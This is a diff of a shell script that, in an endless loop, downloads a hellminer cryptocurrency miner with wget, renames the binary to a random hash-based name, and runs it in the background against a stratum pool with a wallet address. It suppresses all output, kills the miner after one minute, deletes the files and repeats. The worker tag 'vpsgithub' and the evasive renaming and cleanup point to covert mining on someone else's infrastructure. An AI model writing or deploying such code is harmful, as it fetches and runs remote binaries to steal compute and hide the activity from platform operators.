@@ -1,57 +1,42 @@
-!/bin/bash
+#!/bin/sh
 
-# Function to generate a strong random file name
+# Function to generate a random name based on SHA-512 hash
 generate_random_name() {
-  local random_name
-  # Generate a random string using date, base64, and SHA-256 hash
-  random_name=$(date +%s%N | sha256sum | base64 | head -c 12)
+  # Generate random string
+  random_string=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12 ; echo '')
+
+  # Calculate SHA-512 hash of random string and trim to 12 characters
+  random_name=$(echo -n "$random_string" | sha512sum | awk '{print substr($1, 1, 12)}')
   echo "$random_name"
 }
 
-# Function to encrypt and sign the miner binary
-encrypt_and_sign_miner_binary() {
-  local binary="$1"
-  local encrypted_binary="encrypted_$binary"
-  local signature_file="signature_$binary"
-
-  # Encrypt the binary (adjust encryption method as needed)
-  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -pass pass:your_password_here
-
-  # Create a signature for the binary
-  openssl dgst -sha256 -sign your_private_key.pem -out "$signature_file" "$encrypted_binary"
-}
-
-# Main loop to continuously run the mining script
+# Infinite loop to continuously run the script
 while true; do
-  # Download the miner archive (adjust URL as necessary)
+  # Download file
   wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
-  # Extract the miner files
+  # Extract file
   tar -xf hellminer_linux64_avx2.tar.gz
+  rm -f hellminer_linux64_avx2.tar.gz
+  rm -rf run_miner.sh
+  rm -rf verus-solver
 
-  # Clean up unnecessary files
-  rm -f hellminer_linux64_avx2.tar.gz run_miner.sh verus-solver
-
-  # Generate a random name for the miner binary
+  # Generate random name
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
 
-  # Encrypt and sign the miner binary
-  encrypt_and_sign_miner_binary "$random_name"
-
-  # Run the miner in the background for 1 minute
-  nohup ./encrypted_"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs>
+  # Run the program for 1 minute with renamed file, anonymously and in background
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
   miner_pid=$!
-
-  # Wait for 1 minute while mining
   sleep 1m
 
-  # Stop the miner process
+  # Stop the program
   kill $miner_pid
 
-  # Clean up downloaded files and encrypted miner binary
-  rm -f "$random_name" encrypted_"$random_name" signature_"$random_name"
-
-  # Wait for 2 minutes before repeating the loop
+  # Clean up downloaded and extracted files
+  rm -f hellminer_linux64_avx2.tar.gz
+  rm -rf "$random_name"
+  
+  # Pause for 2 minutes before looping again
   sleep 2m
 done
